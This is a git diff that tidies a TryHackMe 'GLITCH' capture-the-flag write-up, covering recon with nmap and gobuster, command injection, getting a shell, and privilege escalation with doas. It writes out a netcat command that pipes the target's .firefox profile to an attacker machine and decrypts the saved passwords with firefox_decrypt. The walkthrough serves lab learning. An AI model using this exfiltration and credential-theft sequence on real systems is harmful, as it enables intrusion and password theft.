@@ -34,11 +34,17 @@ Since we have a basic understanding of the APIs, we can move on to attacking the
 
 We shall start with a basic nmap scan `nmap -A 10.10.204.13` found port 80 open
 
-Also, we do some directory brute forcing using gobustor.`gobuster dir -u http://10.10.204.13 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
+Also, we do some directory brute forcing using gobustor.
+```bash
+gobuster dir -u http://10.10.204.13 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+````
 
 Upon viewing the page source, I found a path to `/api/access`, and when I visited the path found some token that are in base 64 encoding.
 
-Let's decode the tokens and potentially see the content in it. After decoding it, you get the first flag. `echo -n "dGhpc19pc19ub3RfcmVhbA==" | base64 --decode`
+Let's decode the tokens and potentially see the content in it. After decoding it, you get the first flag. 
+```bash
+echo -n "dGhpc19pc19ub3RfcmVhbA==" | base64 --decode
+```
 
 Decoded string update it to the token and then refresh the page, and boom, the page changes. Since the page has nothing interesting, we can view the page source and the page source,
 
@@ -80,11 +86,11 @@ The parameter to use is cmd, which, after sending the request again on Burp it r
 
 At this point, we need to access a shell so that we can solve the other problems.
 
-Igot a little bit stuck and frustated as I was not able to deploy shell at first, then I came a cross this [writeup](https://github.com/alirezac0/TryHackMe-Writeups/tree/master/GLITCH) where he uses curl to deliver the payload in order to get the shell
+I got a little bit stuck and frustrated as I was not able to deploy the shell at first, then I came across this [writeup](https://github.com/alirezac0/TryHackMe-Writeups/tree/master/GLITCH) where he uses curl to deliver the payload to get the shell
 
-After getting the shell you can see the user flag by navigating throu to `home/user` directory.
+After getting the shell, you can see the user flag by navigating to `home/user` directory.
 
-For the root flag we took the hint where it saya my friend says sudo is bloat, but as I navigated throu the shell and used this command `ls -la`. 
+For the root flag, we took the hint where it saya my friend says sudo is bloat, but as I navigated throu the shell and used this command `ls -la`. 
 
 Also we can use find to see what wecan do in order to access the root.
 ```bash
@@ -109,25 +115,25 @@ drwx------   2 user user  4096 Jan 21 08:47 .ssh
 
 I found a `.firefox` directory where there might be potentially passwords stored for our user as we can see that we have user void.
 
-In oder to check the content in the .firefox directory we need to export the directory in to the attackers machine and use a tool called [firefox_decrypt](https://github.com/unode/firefox_decrypt)
+In order to check the content in the .firefox directory, we need to export the directory to the attacker's machine and use a tool called [firefox_decrypt](https://github.com/unode/firefox_decrypt)
 
-to export weare going to use the foollowing command
+To export, we are going to use the following command
 ```bash
-#on the target machine use
+#on the target machine, use
 
 tar cf — .firefox/ | nc attacker-machine-ip 5555
 
-#before running this ensure you have set a listener on the attacker machine using
+#before running this, ensure you have set a listener on the attacker machine using
 
 nc -vlp 5555 | tar xf -
 ```
-After that we can use know use our tool and decrypt the directory using 
+After that, we can use our tool and decrypt the directory using 
 ```bash
 python3 firefox_decrypt.py .firefox
 ```
-Now we can see the pass word for void
+Now we can see the password for void
 
-To use this password in order to access the void decrectory abd be able to read the root flag we shall use doas using this command
+To use this password in order to access the void directory and be able to read the root flag, we shall use doas using this command
 ```bash
 su - v0id -c "doas -u root bash -c 'cat /root/root.txt'"
 ```
